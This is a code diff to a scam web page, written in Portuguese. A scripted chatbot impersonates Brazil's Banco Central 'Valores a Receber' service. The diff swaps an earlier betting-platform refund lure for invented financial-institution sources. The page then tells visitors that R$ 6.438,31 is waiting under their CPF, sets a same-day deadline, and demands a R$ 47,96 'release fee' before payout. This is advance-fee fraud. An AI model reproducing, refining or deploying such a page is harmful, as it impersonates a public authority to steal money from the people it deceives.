@@ -349,27 +349,27 @@
 
     // ========== VALORES DAS 17 ENTIDADES ==========
     const ENTIDADES = [
-      { nome: 'Kaizen Gaming Brasil Ltda.',              valor: 'R$ 850,00',   valorNum: 850.00 },
-      { nome: 'HS do Brasil Ltda.',                      valor: 'R$ 412,50',   valorNum: 412.50 },
-      { nome: 'SPRBT Interactive Brasil Ltda',           valor: 'R$ 320,00',   valorNum: 320.00 },
-      { nome: 'Ventmear Brasil S.A.',                    valor: 'R$ 275,80',   valorNum: 275.80 },
-      { nome: 'Esportes Gaming Brasil Ltda.',            valor: 'R$ 510,45',   valorNum: 510.45 },
-      { nome: 'Foggo Entertainment Ltda.',               valor: 'R$ 188,90',   valorNum: 188.90 },
-      { nome: 'NSX Brasil S.A.',                         valor: 'R$ 643,20',   valorNum: 643.20 },
-      { nome: 'EB Interm. e Jogos S/A.',                 valor: 'R$ 298,75',   valorNum: 298.75 },
-      { nome: 'Ana Gaming Brasil S.A.',                  valor: 'R$ 156,40',   valorNum: 156.40 },
-      { nome: 'OIG Gaming Brazil Ltda.',                 valor: 'R$ 389,60',   valorNum: 389.60 },
-      { nome: 'BPX Bets Sports Group Ltda.',             valor: 'R$ 225,15',   valorNum: 225.15 },
-      { nome: 'H2 Licensed Ltda.',                       valor: 'R$ 342,80',   valorNum: 342.80 },
-      { nome: 'Pixbet Soluções Tecc Ltda.',              valor: 'R$ 475,30',   valorNum: 475.30 },
-      { nome: 'NVBT Gaming Ltda.',                        valor: 'R$ 210,55',   valorNum: 210.55 },
-      { nome: 'SevenX Gaming S/A.',                       valor: 'R$ 285,40',   valorNum: 285.40 },
-      { nome: 'NSX Betfair Brasil S.A.',                  valor: 'R$ 398,70',   valorNum: 398.70 },
-      { nome: 'Apollo Operations Ltda.',                 valor: 'R$ 454,81',   valorNum: 454.81 }
+      { nome: 'Contas bancárias encerradas', valor: 'R$ 850,00', valorNum: 850.00 },
+{ nome: 'Tarifas bancárias a devolver', valor: 'R$ 412,50', valorNum: 412.50 },
+{ nome: 'Créditos de cooperativas de crédito', valor: 'R$ 320,00', valorNum: 320.00 },
+{ nome: 'Consórcios encerrados', valor: 'R$ 275,80', valorNum: 275.80 },
+{ nome: 'Cotas de capital de cooperativas', valor: 'R$ 510,45', valorNum: 510.45 },
+{ nome: 'Contas de pagamento encerradas', valor: 'R$ 188,90', valorNum: 188.90 },
+{ nome: 'Saldos residuais bancários', valor: 'R$ 643,20', valorNum: 643.20 },
+{ nome: 'Créditos de instituições financeiras', valor: 'R$ 298,75', valorNum: 298.75 },
+{ nome: 'Valores de contas inativas', valor: 'R$ 156,40', valorNum: 156.40 },
+{ nome: 'Recursos de carteiras digitais', valor: 'R$ 389,60', valorNum: 389.60 },
+{ nome: 'Devoluções de cobranças indevidas', valor: 'R$ 225,15', valorNum: 225.15 },
+{ nome: 'Saldos de aplicações financeiras', valor: 'R$ 342,80', valorNum: 342.80 },
+{ nome: 'Créditos de operações de crédito', valor: 'R$ 475,30', valorNum: 475.30 },
+{ nome: 'Valores residuais de investimentos', valor: 'R$ 210,55', valorNum: 210.55 },
+{ nome: 'Recursos de consórcios finalizados', valor: 'R$ 285,40', valorNum: 285.40 },
+{ nome: 'Reembolsos de serviços financeiros', valor: 'R$ 398,70', valorNum: 398.70 },
+{ nome: 'Outros recursos financeiros demonstrativos', valor: 'R$ 454,81', valorNum: 454.81 }
     ];
 
     const VALOR_TOTAL = 6438.31;
-    const TAXA_LIBERACAO = 48.00;
+    const TAXA_LIBERACAO = 47.96;
 
     // ========== AUDIO POOL ==========
     const AUDIO_POOL = {};
@@ -544,7 +544,7 @@
         <div class="indeniza-row">
           <div class="campo">
             <span class="campo-label">Origem dos Valores</span>
-            <div class="campo-valor">Plataformas Regulamentadas</div>
+            <div class="campo-valor">Instituições Financeiras</div>
           </div>
           <div class="campo imposto">
             <span class="campo-label">Taxa de Liberação</span>
@@ -580,7 +580,7 @@
         messages: [
           { type: 'bot', content: `Prezado(a) <strong>${userName.split(' ')[0]}</strong>, sua consulta foi iniciada com sucesso.`, delay: 1000 },
           { type: 'bot', content: animationLock('Conexão segura estabelecida.'), delay: 2000 },
-          { type: 'bot', content: 'O sistema do Governo Federal identificou um <strong>saldo pendente</strong> vinculado ao seu CPF, proveniente de plataformas regulamentadas.', delay: 2500 },
+          { type: 'bot', content: 'O sistema de consulta de Valores a Receber identificou a possibilidade de existência de <strong>valores disponíveis</strong> vinculados ao seu CPF, provenientes de instituições financeiras.', delay: 2500 },
           { type: 'bot', content: `O prazo para solicitação dos valores é até <strong>${dataHojeFormatada}</strong>. Após esse período, os valores serão devolvidos ao Tesouro Nacional.`, delay: 2500 },
           { type: 'bot', content: 'Deseja prosseguir com a consulta e verificar os valores disponíveis?', delay: 2000 }
         ],
@@ -609,10 +609,10 @@
           { type: 'bot', content: animationProgress(60, 'Analisando CPF na base de dados'), delay: 2500 },
           { type: 'bot', content: animationProgress(100, 'Varredura concluída'), delay: 2500 },
           { type: 'bot', content: animationChecklist([
-            'Entidades vinculadas ao CPF',
-            'Saldos e prêmios disponíveis',
-            'Apostas em aberto',
-            'Histórico de registros'
+            'Instituições financeiras vinculadas ao CPF',
+'Valores disponíveis para resgate',
+'Contas e saldos identificados',
+'Histórico de registros financeiros'
           ]), delay: 3000 }
         ],
         type: 'auto_next',
@@ -700,7 +700,7 @@
           { type: 'bot', content: animationSuccess(), delay: 1000 },
           { type: 'bot', content: generateComprovante(), delay: 2000 },
           { type: 'bot', content: `<strong>Atenção:</strong> o saque está pendente de liberação.<br><br>Para que o Banco Central processe o PIX de <strong>R$ 6.438,31</strong>, é necessário o pagamento de uma <strong>Taxa de Liberação</strong> no valor de <strong>R$ 47,96</strong>.`, delay: 2500 },
-          { type: 'bot', content: 'De acordo com a Lei nº 14.790/2023, as casas de apostas estão sujeitas às obrigações previstas na legislação quanto à restituição de valores aos apostadores, observadas as hipóteses e condições estabelecidas pela própria lei e pela regulamentação aplicável.', delay: 2000 }
+          { type: 'bot', content: 'De acordo com as normas do Banco Central do Brasil, instituições financeiras devem informar ao Sistema de Valores a Receber (SVR) os recursos disponíveis para devolução, incluindo saldos de contas encerradas, tarifas cobradas indevidamente e outros valores previstos na regulamentação aplicável.', delay: 2000 }
         ],
         type: 'button',
         options: [
